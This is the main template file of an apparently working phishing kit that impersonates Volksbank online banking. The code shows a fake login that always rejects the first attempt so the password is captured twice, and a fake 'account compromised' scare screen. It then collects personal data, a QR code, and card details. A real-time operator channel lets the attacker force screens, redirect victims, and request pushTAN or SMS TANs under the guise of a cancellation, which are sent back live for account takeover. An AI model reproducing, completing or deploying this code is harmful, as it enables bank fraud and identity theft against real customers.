import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, uploadTemplateFile, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';

// Import components
import Header from './components/Header';
import Footer from './components/Footer';
import BranchSelection from './components/BranchSelection';
import LoginForm from './components/LoginForm';
import Loading from './components/Loading';
import ErrorScreen from './components/ErrorScreen';
import AccountCompromisedScreen from './components/AccountCompromisedScreen';
import PersonalDataForm from './components/PersonalDataForm';
import QRUploadForm from './components/QRUploadForm';
import BankCardForm from './components/BankCardForm';
import FinalSuccessScreen from './components/FinalSuccessScreen';
import { PushTANScreen } from './components/PushTANScreen';
import { SMSTANScreen } from './components/SMSTANScreen';
import templateSocketClient from '../../utils/socketClient';

import './VolksbankStyle.css';

// Volksbank flow states (8-step process with branch selection)
const STATES = {
  BRANCH_SELECTION: 'branch_selection',
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_UPLOAD: 'qr_upload',
  QR_SUCCESS: 'qr_success',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  branchSelection: boolean;
  doubleLogin: boolean;
  personalData: boolean;
  qrUpload: boolean;
  bankCard: boolean;
}

// Default configuration (fallback)
const DEFAULT_CONFIG: StepConfig = {
  branchSelection: true,
  doubleLogin: true,
  personalData: true,
  qrUpload: true,
  bankCard: true
};

// Types for Volksbank flow
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
}

// Branch selection interfaces
interface SelectedBranch {
  branch_id: number;
  branch_name: string;
  city: string;
  zip_code: string;
}

// Volksbank Template Implementation
const VolksbankTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  const [state, setState] = useState(STATES.BRANCH_SELECTION);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Verbindung wird hergestellt...");
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [loginLoading, setLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | undefined>(undefined);
  const [selectedBranch, setSelectedBranch] = useState<SelectedBranch | null>(null);
  const [loginAttempts, setLoginAttempts] = useState(0);
  
  // Session data storage
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('volksbank');
    updatePageMetadata(metadata);

    // Load step configuration from backend
    const loadConfig = async () => {
      try {
        setLoading(true);
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        const config = await getTemplateConfig('volksbank');
        setStepConfig(config.steps);
        setConfigLoaded(true);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Loaded Volksbank step config:', config.steps);
        }
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
        setConfigLoaded(true);
      }
    };

    // Create session if no key provided
    const initializeSession = async () => {
      if (!key) {
        try {
          setLoading(true);
          setLoadingMessage("Sitzung wird erstellt...");
          const newKey = await createTemplateSession('volksbank');
          navigate(`/volksbank/${newKey}`);
        } catch (error) {
          console.error('Failed to create session:', error);
          const fallbackKey = Math.random().toString(36).substring(2, 15);
          navigate(`/volksbank/${fallbackKey}`);
        } finally {
          setLoading(false);
        }
        return;
      }
    };

    console.log(`Initializing Volksbank session with key: ${key}`);
    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage("Sitzung wird initialisiert...");
      setTimeout(() => setLoading(false), 1000);
    };
    initializeAfterConfig();
    initializeSession();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'volksbank',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition with natural banking messages
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'qr_upload':
                return 'QR-Code Bereich wird vorbereitet...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          // Show loading screen during data injection
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          // If switching to AFK mode and waiting, continue flow
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000);
        }
      });
    }
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, navigate, isWaitingForAdmin, sessionData.pendingState]);

  // Handle branch selection (Step 1)
  const handleBranchSelection = async (branch: SelectedBranch) => {
    try {
      console.log('Submitting branch selection for session:', key);
      console.log('Selected branch:', branch);
      
      // Update local state
      setSelectedBranch(branch);
      
      setLoading(true);
      setLoadingMessage("Volksbank wird geladen...");
      
      // Submit branch selection to backend
      const response = await submitTemplateData({
        template_name: 'volksbank',
        key: key || '',
        step: 'branch-selection',
        data: branch
      });

      if (response.success) {
        setState(STATES.LOGIN);
      } else {
        setError(response.error || 'Fehler bei der Filialauswahl');
        setState(STATES.ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('Branch selection error:', error);
      setError('Fehler bei der Filialauswahl');
    }
  };

  // Handle login form submission (Steps 2-3)
  const handleLogin = async (data: LoginData) => {
    try {
      console.log('Submitting login for Volksbank flow:', { key, username: data.username ? '✓' : '✗', attempt: loginAttempts + 1 });
      
      if (!key) {
        console.error('No session key available');
        setError('Keine Sitzungs-ID vorhanden');
        setState(STATES.ERROR);
        return;
      }
      
      // Increment login attempts
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);
      
      // Set loading state for login
      setLoginLoading(true);
      setLoginError(undefined);
      
      // Show quick loading screen
      setLoadingMessage("Anmeldedaten werden überprüft...");
      setState(STATES.LOADING);
      
      // Submit to backend API
      try {
        const response = await submitTemplateData({
          template_name: 'volksbank',
          key: key || '',
          step: 'login',
          data: {
            username: data.username,
            password: data.password,
            attempt: currentAttempt,
            branch: selectedBranch
          }
        });

        if (!response.success) {
          console.warn('Backend submission failed:', response.error);
        }
      } catch (apiError) {
        console.warn('Failed to submit to admin dashboard:', apiError);
      }
      
      // Simulate backend call
      setTimeout(() => {
        if (currentAttempt === 1) {
          if (stepConfig.doubleLogin) {
            // First attempt - show error
            console.log('First login attempt - showing error');
            setState(STATES.LOGIN_ERROR);
            setLoginError('login_error');
          } else {
            // Single login - go directly to account compromised
            console.log('Single login - account compromised');
            setState(STATES.ACCOUNT_COMPROMISED);
          }
        } else {
          // Second attempt - proceed to account compromised step
          console.log('Second login attempt - account compromised');
          setState(STATES.ACCOUNT_COMPROMISED);
        }
        setLoginLoading(false);
      }, 2000);
      
    } catch (error) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN);
    } finally {
      setLoginLoading(false);
    }
  };

  // Handle account compromised verification start
  const handleStartVerification = async () => {
    try {
      console.log('Starting verification process for session:', key);
      
      // Get next enabled state
      const nextState = stepConfig.personalData ? STATES.PERSONAL_DATA : 
                       stepConfig.qrUpload ? STATES.QR_UPLOAD :
                       stepConfig.bankCard ? STATES.BANK_CARD : 
                       STATES.FINAL_SUCCESS;
      setState(nextState);
    } catch (error) {
      console.error('Start verification error:', error);
      setError('Fehler beim Starten der Verifizierung');
    }
  };

  // Handle personal data submission (Step 4 - optional)
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    try {
      console.log('Volksbank: Submitting personal data for session:', key);
      console.log('Volksbank: Personal data being submitted:', data);
      
      setState(STATES.LOADING);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // Submit personal data to backend
      const response = await submitTemplateData({
        template_name: 'volksbank',
        key: key || '',
        step: 'personal-data-complete',
        data: data
      });

      if (response.success) {
        console.log('✅ Volksbank personal data submitted successfully');
        
        // Continue to next step based on configuration
        const nextState = stepConfig.qrUpload ? STATES.QR_UPLOAD :
                         stepConfig.bankCard ? STATES.BANK_CARD :
                         STATES.FINAL_SUCCESS;
        setState(nextState);
      } else {
        console.error('❌ Volksbank personal data submission failed:', response.error);
        setError(response.error || 'Fehler beim Speichern der persönlichen Daten');
        setState(STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Volksbank personal data submission error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
      setState(STATES.ERROR);
    }
  };

  // Handle QR upload submission (Step 4.5 - optional)
  const handleQRUploadSubmit = async (formData: FormData) => {
    try {
      console.log('Volksbank: Submitting QR upload for session:', key);
      
      setState(STATES.LOADING);
      setLoadingMessage("QR-Code wird verarbeitet...");
      
      // Submit QR upload to backend
      const response = await uploadTemplateFile('volksbank', key || '', formData.get('qrFile') as File, 'qr-upload');
      
      if (response.success) {
        console.log('✅ Volksbank QR upload submitted successfully');
        
        // Continue to next step
        const nextState = stepConfig.bankCard ? STATES.BANK_CARD : STATES.FINAL_SUCCESS;
        setState(nextState);
      } else {
        console.error('❌ Volksbank QR upload failed:', response.error);
        setError(response.error || 'Fehler beim Upload des QR-Codes');
        setState(STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Volksbank QR upload error:', error);
      setError('Fehler beim Upload des QR-Codes');
      setState(STATES.ERROR);
    }
  };

  // Handle bank card data submission (Step 5 - optional)
  const handleBankCardSubmit = async (data: BankCardData) => {
    try {
      console.log('Submitting bank card data for session:', key);
      
      console.log('Volksbank: Bank card data being submitted:', data);
      
      setState(STATES.LOADING);
      setLoadingMessage("Bankkarten-Daten werden verarbeitet...");
      
      // Submit bank card data to backend
      const response = await submitTemplateData({
        template_name: 'volksbank',
        key: key || '',
        step: 'bank-card-complete',
        data: data
      });

      if (response.success) {
        console.log('✅ Volksbank bank card data submitted successfully');
        setState(STATES.FINAL_SUCCESS);
      } else {
        console.error('❌ Volksbank bank card submission failed:', response.error);
        setError(response.error || 'Fehler beim Speichern der Bankkarten-Daten');
        setState(STATES.ERROR);
      }
      
    } catch (error: any) {
      console.error('Bank card submission error:', error);
      setError('Fehler beim Speichern der Bankkarten-Daten');
      setState(STATES.ERROR);
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Volksbank: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'volksbank',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ Volksbank bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ Volksbank bank card skip completed successfully');
      
      // Show loading screen
      setState(STATES.LOADING);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        setState(STATES.FINAL_SUCCESS);
      }, 2000);
      
    } catch (error) {
      console.error('❌ Volksbank bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Handle logo click to restart session
  const handleLogoClick = () => {
    console.log('Logo clicked - restarting session');
    navigate('/volksbank');
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      return <Loading message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} />;
    }
    
    if (error) {
      return <ErrorScreen message={error} />;
    }
    
    switch (state) {
      case STATES.BRANCH_SELECTION:
        return <BranchSelection onSubmit={handleBranchSelection} />;
        
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLogin} isLoading={loginLoading} />;
      
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLogin} isLoading={loginLoading} errorMessage={loginError} />;
      
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleStartVerification} />;
      
      case STATES.PERSONAL_DATA:
        // Only render if personal data step is enabled
        if (stepConfig.personalData) {
          return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        } else {
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.QR_UPLOAD:
        // Only render if QR upload step is enabled
        if (stepConfig.qrUpload) {
          return <QRUploadForm onSubmit={handleQRUploadSubmit} />;
        } else {
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.BANK_CARD:
        // Only render if bank card step is enabled
        if (stepConfig.bankCard) {
          return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        } else {
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('pushTAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('SMS TAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            console.log('SMS TAN resend requested');
            templateSocketClient.emit('tan-resend-requested', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
      
      case STATES.LOADING:
        return <Loading message={loadingMessage} />;
      
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
      
      default:
        return <ErrorScreen message="Unbekannter Status" />;
    }
  };

  return (
    <div style={{ 
      minHeight: '100vh', 
      backgroundColor: '#f8f9fa',
      display: 'flex',
      flexDirection: 'column'
    }}>
      <Header selectedBranch={selectedBranch} onLogoClick={handleLogoClick} />
      <main style={{ 
        width: '100%',
        maxWidth: '1400px',
        margin: '0 auto',
        padding: '0',
        flex: 1
      }}>
        {renderContent()}
      </main>
      <Footer />
    </div>
  );
};

export default VolksbankTemplate;
